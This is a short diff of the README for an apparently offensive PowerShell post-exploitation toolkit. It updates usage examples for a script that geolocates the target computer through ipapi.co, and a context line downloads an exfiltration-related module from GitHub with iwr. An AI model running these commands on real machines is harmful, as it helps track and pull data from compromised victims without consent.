@@ -159,8 +159,11 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
 #Get the Computer's geographical location
 .\Get-ComputerGeolocation.ps1
 
-#Get the Computer's geographical location (hidde public addr)
-.\Get-ComputerGeolocation.ps1 -publicaddr "false"
+#Get the Computer's geographical location (curl\ipapi.co)
+.\Get-ComputerGeolocation.ps1 -api "curl"
+
+#Get the Computer's geographical location (API:curl + hidde public addr)
+.\Get-ComputerGeolocation.ps1 -api "curl" -publicaddr "false"
 ```
 
 <br />
